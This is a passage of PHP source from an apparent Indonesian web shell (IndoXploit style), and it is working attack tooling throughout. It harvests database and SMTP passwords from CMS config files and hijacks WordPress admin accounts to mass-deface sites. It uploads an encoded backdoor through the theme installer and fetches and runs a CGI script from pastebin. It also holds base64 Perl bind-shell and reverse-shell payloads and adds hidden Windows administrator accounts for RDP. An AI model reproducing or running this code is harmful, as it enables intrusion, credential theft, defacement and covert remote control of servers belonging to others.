				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' class='btn btn-success btn-sm' value='Hajar'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=#48D1CC>$smtp_host</font><br>";
				echo "SMTP port: <font color=#48D1CC>$smtp_port</font><br>";
				echo "SMTP user: <font color=#48D1CC>$smtp_user</font><br>";
				echo "SMTP pass: <font color=#48D1CC>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=#48D1CC>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=#48D1CC>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gak bisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=#18BC9C>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='HACKED BY: MR-X666X' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> yaa, up aja gan :P</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' class='btn btn-success btn-sm' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
	echo "</center>";
} elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = getsource("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=#18BC9C>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' class='btn btn-success btn-sm' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=#18BC9C><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=#18BC9C><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "Mr.TenAr-TEAM";
		$pass = "Mr.TenAr-TEAM";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gak bisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='#18BC9C'>berhasil depes sayang ..</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal depes sayang ..</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=#18BC9C>$user</font><br>";
            	        echo "[+] password: <font color=#18BC9C>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='HACKED BY: Mr.TenAr-TEAM' required><br>
		<input type='submit' class='btn btn-success btn-sm' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['do'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "Mr.TenAr-TEAM";
		$pass = "Mr.TenAr-TEAM";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gak bisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='#18BC9C'>berhasil pepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal pepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=#18BC9C>$user</font><br>";
                    echo "[+] password: <font color=#18BC9C>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='HACKED BY: Mr.TenAr-TEAM' required><br>
		<input type='submit' class='btn btn-success btn-sm' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
} elseif($_GET['do'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' class='btn btn-success btn-sm' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' class='btn btn-success btn-sm' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=#18BC9C>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO<br>
    			------------------------------<br>
    			IP: <font color=#18BC9C>".$ip."</font><br>
    			Username: <font color=#18BC9C>$user</font><br>
    			Password: <font color=#18BC9C>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='#18BC9C'>Gud, sukses pak </font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Coba lagi, luh kurang TAMVAN </font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='#18BC9C'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='#18BC9C'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='#18BC9C'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=#18BC9C>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=#18BC9C>Sudah ada</font><br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font>";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user indoxploit");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=#18BC9C>indoxploit</font>] -> ";
					if($cek) {
						echo "<font color=#18BC9C>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=#18BC9C>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=#18BC9C>$user</font>] -> ";
					if($cek) {
						echo "<font color=#18BC9C>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=#18BC9C>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='indoxploit' required>
			<input type='text' name='pass' placeholder='password' value='indoxploit' required>
			<input type='submit' class='btn btn-success btn-sm' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
